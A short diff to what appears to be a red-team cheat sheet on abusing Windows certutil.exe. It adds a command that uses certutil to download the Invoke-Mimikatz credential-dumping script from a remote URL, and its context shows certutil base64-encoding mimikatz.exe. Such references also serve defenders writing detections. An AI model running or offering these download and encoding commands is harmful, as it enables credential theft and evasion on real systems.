@@ -104,6 +104,13 @@ Links:
 https://twitter.com/subtee/status/888122309852016641?lang=en
 
 
+certutil.exe -verifyctl -split -f https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
+
+Links:
+
+https://twitter.com/egre55/status/1087685529016193025
+
+
 ## certutil.exe base64
 
 `certutil.exe -encode mimikatz.exe mimikatz.txt`
